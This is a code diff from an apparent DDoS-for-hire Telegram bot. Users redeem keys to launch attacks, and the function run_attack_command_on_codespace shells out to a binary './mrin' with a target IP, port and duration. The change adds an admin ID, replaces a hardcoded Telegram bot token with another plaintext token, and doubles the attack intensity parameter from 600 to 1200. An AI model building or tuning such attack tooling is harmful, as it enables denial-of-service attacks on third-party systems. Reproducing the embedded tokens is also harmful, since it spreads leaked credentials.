@@ -11,8 +11,8 @@ from datetime import datetime, timedelta
 from telebot.apihelper import ApiTelegramException
 
 # Convert ADMIN_IDS to a list of integers
-ADMIN_IDS = 6768273586, 2007860433  # Changed from string to list of integers
-BOT_TOKEN = "7775840737:AAFmUfq_O-IctYTJ13ErkiJ-_8XQqiGL-dA"
+ADMIN_IDS = 6768273586, 2007860433, 5004674194  # Changed from string to list of integers
+BOT_TOKEN = "7527768602:AAGzHw1r_xEPAOVydKBikd2Qgnv1u8UNCvk"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 redeemed_keys = set()
@@ -73,7 +73,7 @@ def add_keys_to_dict(key, duration):
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
-    command = f"./mrin {target_ip} {target_port} {duration} 600"
+    command = f"./mrin {target_ip} {target_port} {duration} 1200"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
